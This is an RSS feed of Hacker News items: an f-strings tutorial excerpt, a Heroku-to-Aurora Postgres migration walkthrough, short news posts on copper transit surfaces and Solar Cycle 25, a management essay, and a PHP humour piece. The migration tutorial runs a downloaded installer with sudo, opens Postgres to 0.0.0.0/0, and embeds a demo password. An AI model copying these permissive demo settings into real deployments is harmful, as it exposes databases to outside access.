<span>&gt;&gt;&gt; </span><span>f'<span>{c:r}</span>'</span>
<span>'Color(r=123, g=32, b=255)'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c:j}</span>'</span>
---------------------------------------------------------------------------
ValueError                                Traceback (most recent call last)
&lt;ipython-input<span>-20</span><span>-1</span>c0ee8dd74be&gt; <span>in</span> &lt;module&gt;
----&gt; <span>1</span> <span>f'<span>{c:j}</span>'</span>

&lt;ipython-input<span>-15</span><span>-985</span>c4992e957&gt; <span>in</span> __format__(self, format_spec)
     <span>29</span>                 <span>f"- A SUPER verbose nice RGB thing."</span>
     <span>30</span>             )
---&gt; <span>31</span>         <span>raise</span> ValueError(
     <span>32</span>             <span>f"Unknown format code '<span>{format_spec}</span>' "</span> <span>"for object of type 'Color'"</span>
     <span>33</span>         )

ValueError: Unknown format code <span>'j'</span> <span>for</span> object of type <span>'Color'</span>
</code></pre>
<p>Lastly, there's also the <code>a</code> option that escapes non-ASCII chars. For more info: <a href="https://docs.python.org/3/library/functions.html#ascii" target="_blank">docs.python.org/3/library/functions.html#as..</a></p>
<pre><code><span>&gt;&gt;&gt; </span>utf_str = <span>"Áeiöu"</span>

<span>&gt;&gt;&gt; </span><span>f"<span>{utf_str!a}</span>"</span>
<span>"'\\xc1ei\\xf6u'"</span>
</code></pre>
<h2 id="how-to-set-float-number-precision-in-a-f-string">How to Set Float Number Precision in a F-String</h2>
<p>f-strings allow format float numbers similar to <code>str.format</code> method. To do that, you can add a <code>:</code> (colon) followed by a <code>.</code> (dot) and the number of decimal places with a <code>f</code> suffix. </p>
<p>For…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings">https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings</a></em></p>]]>
            </description>
            <link>https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071504</guid>
            <pubDate>Thu, 12 Nov 2020 16:27:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Migrating Large Heroku Postgres Instances to AWS Aurora Without Downtime]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 37 (<a href="https://news.ycombinator.com/item?id=25071502">thread link</a>) | @sciguymcq
<br/>
November 12, 2020 | https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/ | <a href="https://web.archive.org/web/*/https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>
          
          

          
          
          <h3>Introduction</h3>
<p>In this article I discuss a general process I used recently to migrate a large multi-terabyte Heroku Postgres Database from the Heroku Platform to Amazon Aurora Postgres on a live Heroku based application architecture with near zero downtime and builtin failovers during the process. Not only did this migration save significant costs associated with running a large managed Postgres instance it also resulted in increased scalability and flexibility of parameter turing and other management abilities afforded by AWS RDS.</p>

<h4>Contents</h4>
<ul>
<li><a title="Heroku Architecture and Constraints" href="#heroku-architecture-and-constraints">Heroku Architecture and Constraints</a></li>
<li><a title="The RandoNumba Demo App" href="#rando-numba-demo-app">The RandoNumba Demo App</a></li>
<li><a title="Mimicing the Heroku Postgres Service" href="#mimicing-heroku-postgres">Mimicking the Heroku Postgres Service</a></li>
<li><a title="Restore and Promote EC2 Postgres Log Shipped Replica" href="#log-shipped-replica">Restore and Promote EC2 Postgres Log Shipped Replica</a></li>
<li><a title="Create EC2 Postgres Log Streamed Replica" href="#log-streamed-replica">Create EC2 Postgres Log Streamed Replica</a></li>
<li><a title="Switch App Dyno to Promoted EC2 Postgres" href="#switch-to-log-shipped-replica">Switch App Dyno to Promoted EC2 Postgres</a></li>
<li><a title="Initiate Postgres Logical Replication to Aurora Postgres" href="#initiate-logical-replication-to-aurora">Initiate Postgres Logical Replication to Aurora Postgres</a></li>
<li><a title="Switch App Dyno to Aurora Postgres" href="#switch-to-aurora-postgres">Switch App Dyno to Aurora Postgres</a></li>
</ul>
<h3><a id="heroku-architecture-and-constraints"></a>Heroku Architecture and Constraints</h3>
<p><img src="https://thecodinginterface-images.s3.amazonaws.com/blogposts/heroku-postgres-migration/Heroku-Postgres-Migration.jpg" alt="Heroku Migration Diagram" width="991" height="733"></p>
<p>The Heroku Postgres Migration to AWS Aurora Postgres Architecture and Process Flow diagram above shows, at a high level, the Heroku Postgres Data Layer Architecture for a typical Heroku Premium Level Service with High Availability plus a Read Replica for load balancing Read heavy apps. Then on the right is the migration target goal within the AWS platform boundary annotated with the sequence of steps used to migrate the data to the Aurora Postgres instance.</p>
<p>Before I get into discussing the constraints that I've experienced I would like to put forth an important disclaimer. The Heroku platform is a phenominally innovative service that has paved the way for developing countless extremely useful and profitable apps and services by lowering the barrier to entry for small development teams. Many, if not most, apps will not hit the constraints that I point out below alleviating the need for a migration of their data layer off the platform.</p>
<ul>
<li>Heroku can be costly, perhaps for good reasons, because they alleviate much of the sysops / devops investment and dev time costs of maintaining and scaling services like Postgres</li>
<li>Heroku Postgres locks down the majority of the Postgres parameters that are often necessary to tune for large enterprise level, high throughput, Postgres usage</li>
<li>Heroku Postgres monitoring falls well short of many of the other options, particularly AWS RDS, which becomes very important for large enterprise grade applications</li>
<li>Heroku Postgres does not allow Postgres superuser or Replication User roles so migration options become limited</li>
<li>Postgres pg_dump / pg_restore is not a viable option for large databases of a terabyte and up because of the amount of time it requires to run and thus inherently implies down time or data loss if used as an option for failover or migration which isn't possible for most applications</li>
</ul>

<h3><a id="rando-numba-demo-app"></a>The RandoNumba Demo App</h3>
<p>To faciltate this discussion I've provided a toy app that is deployable to Heroku and built using the Django web framework which simply generates random numbers and scrapes quotes from the web.</p>
<p>1) Clone dj-randonumba-heroku app from my GitHub repo</p>
<pre><code>git clone https://github.com/amcquistan/dj-randonumba-heroku.git
cd dj-randonumba-heroku
</code></pre>
<p>2) Create a Heroku App</p>
<pre><code>heroku create</code></pre>
<p>giving the following output but, note you're output will give a different app name and url</p>
<pre><code>Creating app... done, ⬢ intense-headland-79519
https://intense-headland-79519.herokuapp.com/ | https://git.heroku.com/intense-headland-79519.git</code></pre>
<p>Be sure to update `randonumba.settings.ALLOWED_HOSTS` to include the host that Heroku provides.</p>
<p>3) Push the App Code to Heroku</p>
<pre><code>git push heroku master</code></pre>
<p>4) Attach a free tier Heroku Postgres Add on for Demo Purposes</p>
<pre><code>heroku addons:create heroku-postgresql:hobby-dev -a intense-headland-79519</code></pre>
<p>Use psql to create the hstore Postgres extension this demo app uses</p>
<pre><code>heroku pg:psql -a intense-headland-79519
create extension hstore;
\q</code></pre>
<p>then run migrations</p>
<pre><code>heroku run python manage.py migrate -a intense-headland-79519</code></pre>
<p>5) Register and Play with the App</p>
<p>Open the app in your default browser with the following (replace -a intense-headland-79519 with your app name).</p>
<pre><code>heroku open -a intense-headland-79519</code></pre>
<p>Then register the app and generate some randomness</p>
<p><img src="https://thecodinginterface-images.s3.amazonaws.com/blogposts/heroku-postgres-migration/rando-numba-randomness.png" alt="" width="1838" height="948"></p>

<h3><a id="mimicing-heroku-postgres"></a>Mimicking the Heroku Postgres Service</h3>
<p>In the Real World for this process to work you need to request for the Heroku Data Support team to establish continuous WAL log shipping to an AWS S3 bucket along with a base physical backup using the <a title="WAL-E Python based library" href="https://github.com/wal-e/wal-e" target="_blank" rel="noopener">WAL-E Python based library</a>. Rather than bothering Heroku's Data Support team for this demo and to allow readers to fully reproduce the demo I will simply mimick this step with my own AWS EC2 instance running Postgres 11 and shipping a continuous archive to my own AWS S3 bucket.</p>
<h4>Infrastructure Specs and Services</h4>
<ul>
<li>Amazon Linux 2 AMI</li>
<li>Security Group Allowing port 5432 and SSH access</li>
<li>Separate EBS Volume for Installing the Postgres DB Cluster</li>
<li>S3 Bucket for Pushing Base Physical Backup and WAL</li>
<li>IAM User with Programmatic Access to S3</li>
</ul>
<h4>Procedure for Mimicking Heroku Postgres</h4>
<p>1) Update VPS (Virtual Private Server) and Install Dependencies</p>
<pre><code>sudo yum update -y
sudo amazon-linux-extras install epel -y
sudo amazon-linux-extras install postgresql11 -y
sudo yum install postgresql-server postgresql-contrib python3 lzop pv -y
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
sudo python3 get-pip.py
sudo python3 -m pip install envdir wal-e[aws]</code></pre>
<p>2) Mount Volume and Create File System for Postgres Cluster</p>
<p>Use lsblk to identify the EBS volume to install Postgres Cluster on</p>
<pre><code>$ lsblk
NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
xvda    202:0    0   8G  0 disk
└─xvda1 202:1    0   8G  0 part /
xvdb    202:16   0  16G  0 disk</code></pre>
<p>Format volume as a XFS filesystem.</p>
<pre><code>sudo mkfs -t xfs /dev/xvdb</code></pre>
<p>Create a mount point for the volume and mount it to the new directory.</p>
<pre><code>sudo mkdir /database
sudo mount /dev/xvdb /database</code></pre>
<p>Find the device's block id and make the mount permanent in /etc/fstab</p>
<pre><code>sudo blkid # will give you the block id </code></pre>
<p>example entry in /etc/fstab</p>
<pre><code>UUID=19ee2212-7fa0-4c9a-bcbf-cd7019d50fd6     /database   xfs    defaults,nofail   0   2</code></pre>
<p>Test the mount (no errors is the successful outcome).</p>
<pre><code>sudo mount -a</code></pre>
<p>Update permissions of the /database directory for postgres.</p>
<pre><code>sudo chown -R postgres:postgres /database
sudo chmod -R 700 /database</code></pre>
<p>3) Create envdir Directory for AWS Creds used for WAL-E</p>
<pre><code>sudo mkdir -p /etc/wal-e/env
sudo chown -R ec2-user:ec2-user /etc/wal-e
echo "INSERT-VALUE-HERE" &gt; /etc/wal-e/env/AWS_ACCESS_KEY_ID
echo "REGION-HERE" &gt; /etc/wal-e/env/AWS_REGION
echo "INSERT-VALUE-HERE" &gt; /etc/wal-e/env/AWS_SECRET_ACCESS_KEY
echo "S3-BUCKET-FOLDER-URL-HERE" &gt; /etc/wal-e/env/WALE_S3_PREFIX
sudo chown -R postgres:postgres /etc/wal-e
sudo chmod -R 755 /etc/wal-e/env</code></pre>
<p>4) Initialize Postgres Cluster</p>
<p>Run as postgres user.</p>
<pre><code>pg_ctl init -D /database</code></pre>
<p>5) Modify Postgres Configs</p>
<p>First modify /database/postgresql.conf with the following.</p>
<pre><code>listen_addresses = '*' or your apps specific IP
wal_level = replica
archive_mode = on
archive_command = 'envdir /etc/wal-e/env wal-e wal-push %p'
archive_timeout = 60</code></pre>
<p>Update /database/pg_hba.conf for auth (substiture 0.0.0.0/0 with your APPs IP as necessary).</p>
<pre><code>host    pgdb            pguser          0.0.0.0/0               md5</code></pre>
<p>6) Start and Enable Postgres Service</p>
<p>First create a systemd service file for managing the postgresql service in /etc/systemd/system/postgresql.service</p>
<pre><code>.include /lib/systemd/system/postgresql.service

[Service]
Environment=PGDATA=/database
</code></pre>
<p>Reload systemd, start and enable postgresql service</p>
<pre><code>sudo systemctl daemon-reload
sudo systemctl start postgresql
sudo systemctl status postgresql
sudo systemctl enable postgresql</code></pre>
<p>7) Create App Postgres User and Database</p>
<pre><code>createuser -e -l --pwprompt pguser
createdb -e --owner=pguser pgdb</code></pre>
<p>Make hstore extension</p>
<pre><code>psql -d pgdb
create extension hstore;
\q</code></pre>
<p>8) Detach Heroku Postgres Addon and Switch Connection String to EC2 Instance</p>
<p>Note that this is ran locally not on the Amazon EC2 VPS</p>
<p>List addons to get name of Heroku Postgres</p>
<pre><code>heroku addons</code></pre>
<p>Detach the addon for Heroku Postgres</p>
<pre><code>heroku addons:detach name-of-addon -a name-of-heroku-app</code></pre>
<p>Replace the DATABASE_URL config variable to point to the newly spun up EC2 Postgres instance mimicking Heroku Postgres</p>
<pre><code>heroku config:set DATABASE_URL=postgres://pguser:develop3r@ec2-ip-address:5432/pgdb -a name-of-heroku-app
heroku ps:restart -a name-of-heroku-app</code></pre>
<p>Run migrations.</p>
<pre><code>heroku run python manage.py migrate -a name-of-heroku-app</code></pre>
<p>At this point you'll want to register a new user and generate some more test data to migrate. You could also use pg_dump / pg_restore to transfer any existing data from Heroku Postgres to this new EC2 Postgres instance being used to mimic Heroku Postgres</p>
<p><br>9) Push Base Backup to S3 Using WAL-E</p>
<p>Note that tests next commands are to be ran on the Amazon Linux VPS.</p>
<p>As a personal preference I like to wrap potentially long running commands in shell scripts so I can explicitly echo out when things begin and end then to protect against SSH connections from timing out during potentially long running processes I use nohup with backgrounding.</p>
<p>For this I create the following script</p>
<pre><code>mkdir /var/lib/pgsql/scripts &amp;&amp; cd /var/lib/pgsql/scripts
vi wal-e-push-backup.sh</code></pre>
<p>with contents</p>
<pre><code>#!/bin/bash

echo "starting wal-e backup-push"

envdir /etc/wal-e/env wal-e backup-push /database

echo "wal-e backup-push complete"
</code></pre>
<p>Run it.</p>
<pre><code>nohup ./wal-e-push-backup.sh &amp;</code></pre>
<p>After the push finishes I should be able to verify that the backup has been pushed with the following command.</p>
<pre><code>envdir /etc/wal-e/env wal-e backup-list</code></pre>
<p>At this point I have an EC2 Instance with Postgres installed mimicking Heroku Postgres and continuously shipping backups and WAL to S3.</p>
<h3><a id="log-shipped-replica"></a>Restore and Promote EC2 Postgres Log Shipped Replica</h3>
<p>In the real world this is where you will start, that is by creating your log shipped replica loaded from data in S3 in the form of a physical base backup and WAL files. The Heroku Data Support team will likely provide you with S3 creds for WAL-E in the form of Heroku config variables which you can …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/">https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/</a></em></p>]]>
            </description>
            <link>https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071502</guid>
            <pubDate>Thu, 12 Nov 2020 16:27:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Covid-Busting Copper Surfaces]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071396">thread link</a>) | @colinprince
<br/>
November 12, 2020 | https://www.cbc.ca/news/canada/british-columbia/covid-busting-copper-surfaces-coming-to-a-bus-or-skytrain-near-you-1.5797094 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/british-columbia/covid-busting-copper-surfaces-coming-to-a-bus-or-skytrain-near-you-1.5797094">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>TransLink is introducing copper surfaces to a handful of buses and SkyTrain cars is an pilot project to test the natural anti-microbial properties of the metal in a transit setting.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5797507.1605046150!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/translink-copper-surfaces.jpg"></p></div><figcaption>The TransLink copper-surfaces pilot will roll out on two SkyTrain cars and two electric trolley buses.<!-- --> <!-- -->(TransLink)</figcaption></figure><p><span><p>When most people think of copper, they picture pennies, pots and batteries.</p>  <p>But&nbsp;the shiny brown metal also has pandemic busting, self-sanitizing powers that have&nbsp;caught the attention of TransLink during the time of COVID-19.</p>  <p>Copper, as it turns out, has anti-microbial&nbsp;qualities that could make it an important piece of the puzzle for safeguarding riders&nbsp;if applied to high touch surfaces&nbsp;like the poles people hang on to when taking transit.&nbsp;</p>  <p>In a new pilot project,&nbsp;Teck Resources is providing&nbsp;$90,000 to install copper surfaces on&nbsp;two busy electric trolley&nbsp;buses and on two SkyTrain cars running on the Expo and Millennium lines.</p>  <p>"This is an example of testing out new technology and innovation," said outgoing TransLink CEO Kevin Desmond. "Hopefully this has legs."</p>    <p>According to an&nbsp;infectious&nbsp;disease expert with Vancouver Coastal Health, copper can kill bacteria and viruses on contact.</p>  <p>"It can create a situation where it breaks through the membrane of the microorganism, causing&nbsp;leakage and ultimately the death of the microorganism,"&nbsp;said Dr. Marthe Charles.</p>  <p>Charles said the transit study is a continuation of research already taking place at local hospitals. Three copper surfaces and an antimicrobial surface treatment will be tested during the four-week&nbsp;pilot.&nbsp;</p>  <p>The project is the first of its kind for a North American transit system.</p>  <p>Desmond said TransLink ridership has plateaued since the summer and remains at around 43 per cent of pre-pandemic levels.&nbsp;</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/british-columbia/covid-busting-copper-surfaces-coming-to-a-bus-or-skytrain-near-you-1.5797094</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071396</guid>
            <pubDate>Thu, 12 Nov 2020 16:19:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RF Enthusiasts Rejoice – Solar Cycle 25 Has Officially Begun]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071342">thread link</a>) | @themoralone
<br/>
November 12, 2020 | http://k0lwc.com/solar-cycle-25-has-officially-begun/ | <a href="https://web.archive.org/web/*/http://k0lwc.com/solar-cycle-25-has-officially-begun/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-414">
	<!-- .entry-header -->

	<div>
		
<p>Ham radios operators around the world rejoice — Solar Cycle 25 has officially begun! The Royal Observatory of Belgium has reported the solar minimum likely occurred in December of 2019.&nbsp;The solar minimum marks the lowest point of sunspot activity and is the official start of a new cycle.</p>



<p>Amateur radio and shortwave enthusiasts alike have been living with the tail end of a weak solar cycle for years. This means signals on High Frequency (HF) bands have not been good, but that’s now changing and will continue to improve for years to come.</p>



<p>Quote</p>



<blockquote><p>In January 2020, the<a target="_blank" href="http://sidc.be/silso/monthlyssnplot" rel="noreferrer noopener">&nbsp;<em>13-month smoothed sunspot number</em></a>&nbsp;rose for the first time since the maximum of cycle 24 (April 2014). Now, by September 2020, this reversal of the trend was firmly confirmed, officially placing&nbsp;<strong>the minimum between cycles 24 and 25 in December 2019</strong>.</p><cite>Royal Observatory, Belgium.</cite></blockquote>



<p>Solar Cycle 24 had the fourth-smallest intensity since regular record-keeping began with Solar Cycle 1 in 1755. It was also the weakest cycle in a century. Scientists&nbsp;<a target="_blank" href="https://www.swpc.noaa.gov/news/solar-cycle-25-forecast-update" rel="noreferrer noopener">forecast</a>&nbsp;that Solar Cycle 25 will be a fairly weak one, similar to Solar Cycle 24.</p>



<figure><img loading="lazy" width="1024" height="650" src="http://k0lwc.com/wp-content/uploads/2020/11/43FF0635-419A-4DB0-8365-49ABAE25673D-1024x650.jpg" alt="" srcset="http://k0lwc.com/wp-content/uploads/2020/11/43FF0635-419A-4DB0-8365-49ABAE25673D-1024x650.jpg 1024w, http://k0lwc.com/wp-content/uploads/2020/11/43FF0635-419A-4DB0-8365-49ABAE25673D-300x190.jpg 300w, http://k0lwc.com/wp-content/uploads/2020/11/43FF0635-419A-4DB0-8365-49ABAE25673D-768x487.jpg 768w, http://k0lwc.com/wp-content/uploads/2020/11/43FF0635-419A-4DB0-8365-49ABAE25673D-850x539.jpg 850w, http://k0lwc.com/wp-content/uploads/2020/11/43FF0635-419A-4DB0-8365-49ABAE25673D.jpg 1400w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>There are numerous forecasts calling for lower activity in sunspots, but that’s only a prediction. Regardless, HF propagation will only be getting better for many years to come. Time to dust off that long wire and fire up that amplifier!&nbsp;</p>








<br>
			</div><!-- .entry-content -->
</article></div>]]>
            </description>
            <link>http://k0lwc.com/solar-cycle-25-has-officially-begun/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071342</guid>
            <pubDate>Thu, 12 Nov 2020 16:13:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fear of Becoming a Manager]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25071270">thread link</a>) | @eduardsi
<br/>
November 12, 2020 | https://sizovs.net/2020/11/03/fear-of-becoming-a-manager/ | <a href="https://web.archive.org/web/*/https://sizovs.net/2020/11/03/fear-of-becoming-a-manager/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
    
    
  
  <h6>
      November 2020 · Riga, Latvia · <a href="https://sizovs.net/2020/11/03/fear-of-becoming-a-manager/#disqus_thread">comments</a>
  </h6>  
  

  <section>
    <p>As a developer, when I was offered a management job for the first time, my biggest fear was that it would make me a bad programmer because my programming skills and my market competitiveness as a programmer will decline. While talking to young team leaders and tech managers, I discovered that I am not alone.</p>

<p>Fear of having no time for coding stops many good programmers from filling management roles and positively influencing strategic areas of the organization: people, process, enterprise architecture, etc. When developers don’t see themselves as future organization leaders and managers, they stop learning and caring about topics paramount to good management: Lean, Kanban, Change Management, Psychology, Motivation, Systems Thinking.</p>

<figure>
<img src="https://sizovs.net/images/donella.jpg">
<figcaption>
<div>
    
</div>


</figcaption>
</figure>

<p>With knowledge gaps in those areas, we, developers, can’t be in charge of development process. Moreover, we can’t even help people in charge make better, informed decisions. No wonder why developers are rarely invited to non-technical, yet strategically important meetings.</p>

<p>So, by “staying technical” and giving up power to non-technical managers or the least competent developers, good developers are digging themselves a hole. Sitting in that hole, they complain about how bad the leaders, managers, and their created processes are.</p>

<p>Now, let me share some good news with you.</p>

<h3 id="becoming-a-manager-makes-you-a-better-programmer">Becoming a manager makes you a <em>better</em> programmer.</h3>

<p>As a manager, you’ll learn new skills that never get out of date, including communication, delegation, motivation, planning. You’ll learn how to deal with different (and difficult) stakeholders, balance conflicting interests, and reach an agreement. By spending more time next to business people, you’ll better understand their concerns and prepare yourself for running your own company.</p>

<p>Even if you prefer staying employed and “solely technical”, timeless managerial skills will serve you well, because you’ll gain an entirely new perspective on programming: you’ll see it through the manager’s lens. You’ll learn that estimates are <del>evil</del> an essential aspect of financial planning. When putting pressure, good managers expect productive confrontation, not immediate compliance. And that we – engineers – are tough nuts.</p>

<p>With that extra perspective, finding common ground, and reaching an agreement with other managers becomes easier. Finally, you’ll understand that management is not a walk in the park and start empathizing with and helping other managers.</p>

<h3 id="management-experience-opens-new-doors">Management experience opens new doors</h3>

<p>Having any leadership and management experience makes you prepared for more senior roles, such as Engineering Manager, VPoE, or CTO. Finding the right candidate to fill those roles is mission impossible. By having the necessary skills and experience, you’re entering the gold market area with <strong>high demand</strong> and <strong>low competition</strong>. In simple terms, you are now dictating your own rules of the game. And, as the number of programmers increases with incredible speed every year, someone has to manage and lead this non-trivial engineering show.</p>

<h3 id="management-is-power">Management is power</h3>

<p>Management not only comes with a bag of extra responsibilities but also <strong>power</strong> to influence things around you. With great power comes great responsibility, but if you use your authority wisely, <em>finally</em> you can create an environment that you and your colleagues will enjoy. When I became an IT manager, the opportunity to change things according to my values and beliefs, was the main selling point. And because I had enough freedom to manage my time and set my own priorities, I was devoting most of my time to building a no-bullshit engineering culture, hiring and growing great engineers, as well as building my personal brand via public speaking. A big win for my employer also became my personal success story, and I am proud of what we’ve achieved then. When you dare to take the lead, you can create things you’ll be proud of.</p>

<p>Oh, how many things I did wrong. Every day, I experimented with the process, failing and learning from my failures, all in the “safe” environment, while receiving a decent salary and bonuses. Today, as a business owner, I don’t have the luxury of learning at someone else’s expense.</p>

<h3 id="management-helps-you-understand-yourself-better">Management helps you understand yourself better</h3>
<p>To discover your Element – the point at which your natural talent meets personal passion – you have to try different things in your life, including working with different companies, different people, and wearing different hats. For a fulfilling life and career, knowing what you like is equally important as knowing what you don’t. Before you try management, you’ll never know how it’s going to make you feel. What if you’re the next Jack Welch, hiding under a React t-shirt?</p>

<p>Before I tried management, I hated the idea of becoming a manager. While my colleagues encouraged me to go for it, I looked for excuses and arguments for “staying technical.” Then I imagined my company hiring a Bill Lumbergh who’ll be in charge of my team.</p>

<figure>
<img src="https://sizovs.net/images/bill.jpg">
<figcaption>So, Eduards, what's happening?</figcaption>
</figure>

<p>Then I told myself: “it’s better me than Bill.”</p>

<p>Six months was the “probation period” I gave myself before making the final commitment. Treating the role switch as a temporary experiment, not a permanent career change, made me feel safer. In only six months, I have formed my opinion about management, gained some practical, CV-boosting super skills, and invaluable life experience. So, what seemed like a bad idea in theory, turned out an existing and life-changing journey in practice. I fell in love with management and even started <a href="https://sizovs.net/about/#courses">teaching</a> the principles of good management to developers.</p>

<h3 id="management-is-compatible-with-coding">Management is compatible with coding</h3>

<p>Finally, you <strong>can</strong> combine management with coding. Stopping coding is a personal choice, not a necessity. I think it’s a capital mistake to polish your coding skills for years and then just throw them into a bin. If you mastered a hard skill such as coding – protect it at all costs. Management skills should complement your hard skills, not replace them. Remember: trust is the management currency, and gaining full developers’ trust is only possible if you’re a competent software developer.</p>

<p>But how do you find time for coding?</p>

<p>Firstly, you can free up time for coding by <strong>delegating</strong> some management duties to others. If you’re trying to manage everything yourself, it’s a signal of bad management. Management 3.0 book will teach you how to create an environment where management duties are distributed among people in the organization:</p>

<figure>
<img src="https://sizovs.net/images/m30.jpg">
<figcaption>
<div>
    
</div>


</figcaption>
</figure>

<p>But don’t fall into the trap of becoming an individual contributor again. Remember that as a manager, your output is the output of your team. You should be coding strategically. For example, to better understand the system’s quality, you can do a short pair programming session. Or organize a mob programming session to inspire or teach a group of people. Or just quickly hack a prototype to demonstrate a new business idea to customers. Your mileage might vary, but if you’re coding more than managing, it’s a warning signal.</p>

<p>Secondly, <strong>maintaining</strong> existing coding skills is easier than <strong>improving</strong> coding skills. As a manager, unlikely you’ll coding skills will improve, but you can easily stay at the same level.</p>

<p>For me, coding ~8 hours a week was more than enough to stay in good shape. I believe that with proper time planning and delegation, every developer can find those critical eight hours. There were periods in my life when I was overwhelmed at work, so I was writing code for my pet projects on weekends. Later I developed a simple rule: at work, I devote 80% of the time to management and leadership, 20% to programming. It’s possible, and it works.</p>

<p>Moreover, having less time for coding forced me to <a href="https://sizovs.net/2018/12/17/stop-learning-frameworks/">reconsider my learning strategy</a>.</p>

<h3 id="wrap-up">Wrap up</h3>

<p>The Dilbert Principle is real: good programmers are managed by bad programmers and software development processes are organized by clueless MBA wolves. Our industry, companies, and teams need competent leaders and managers with a programming background. If we – programmers – don’t want (or don’t know) how to lead and manage the development process, someone else will do this for us.</p>

<p>There is no good software without good management.</p>

<p>If you’re a good programmer – don’t be afraid of management. Learn management. Try management. And remember that trying is 100% risk-free: you can always return to programming… equipped with management skills.</p>

  </section>


</article></div>]]>
            </description>
            <link>https://sizovs.net/2020/11/03/fear-of-becoming-a-manager/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071270</guid>
            <pubDate>Thu, 12 Nov 2020 16:06:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[2.25 Years to Make $1,100 in Software Revenue]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071194">thread link</a>) | @stephen_greet
<br/>
November 12, 2020 | https://www.beamjobs.com/startups/4-mistakes-going-from-10-to-1100-in-revenue | <a href="https://web.archive.org/web/*/https://www.beamjobs.com/startups/4-mistakes-going-from-10-to-1100-in-revenue">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.beamjobs.com/startups/4-mistakes-going-from-10-to-1100-in-revenue</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071194</guid>
            <pubDate>Thu, 12 Nov 2020 15:59:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If PHP Were British (2011)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071058">thread link</a>) | @susam
<br/>
November 12, 2020 | https://aloneonahill.com/blog/if-php-were-british/ | <a href="https://web.archive.org/web/*/https://aloneonahill.com/blog/if-php-were-british/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content_wide"><div id="content_wide_inner">

    <div id="article">
        <!-- google_ad_section_start -->

    <div>                     <p><img src="https://aloneonahill.com/images/uk_flag.jpg"></p><p>When <a href="http://toys.lerdorf.com/">Rasmus Lerdorf</a> first put <a href="http://www.php.net/">PHP</a> together, he - quite sensibly, despite his heritage - chose not to write it in Greenlandic or Danish. Good job too - that would have been rather unpleasant to work with. He opted instead, being in Canada, for a more local tongue. No, not French. Not Canadian English either. No, he went for that bastard dialect of the Queen's English commonly referred to as "US English".</p>
<p>PHP developers in Britain have been grumpy about this ever since. What was he thinking? And more importantly, how do we undo this travesty? How do we developers ensure the traditions of the British Empire continue to be upheld, even in the digital age?</p>
<h3>A Slap in the Face</h3>
<pre>$variable_name</pre>
<p>The first, but maybe the most important, of many changes that will allow PHP to achieve a more elegant feel is to remove that symbol so beloved by the US and replace it with something altogether more refined. More solid. More ... sterling.</p>
<pre>£variable_name</pre>
<h3>Getting Started</h3>
<pre>&lt;?php
    echo 'Hello World!';
?&gt;</pre>
<p>How many of today's British programmers have been put off at the outset by the brazen informality of this simple yet obscenely Americanised program, colloquially referred to as "Hello World"? A more Imperial, formal introduction might encourage a greater proportion of young British talent to remain with the language and thus give the broader community a more urbane air.</p>
<pre>&lt;?php
    announce 'Good morrow, fellow subjects of the Crown.';
?&gt;</pre>
<h3>Abbreviations</h3>
<p>Few things are more abhorrent to the British than unnecessary abbreviations. "Text speak" is unheard of on the streets of London, as the natural ingrained British grammarian simply refuses to stoop to sending messages of the "c u soon traffic kthxbye" variety, instead proferring something altogether more elegant: "Dear Sir/Madam. I will arrive as soon as time allows, which I expect to be within the hour. I assure you the horses shall not be spared. Yours respectfully." (slower to type, yes, but we do not like to be rushed).</p>
<p>PHP, on the other hand, is full to bursting with abbreviations and acronyms which are entirely unnecessary:</p>
<pre>str_replace()
is_int()
var_dump()
preg_match()
json_encode()
mysql_connect()</pre>
<p>The following changes should improve things:</p>
<pre>string_replace()
is_integer()
variable_dump()
perl_regular_expression_match()
javascript_object_notation_encode()
my_structured_query_language_connect()</pre>
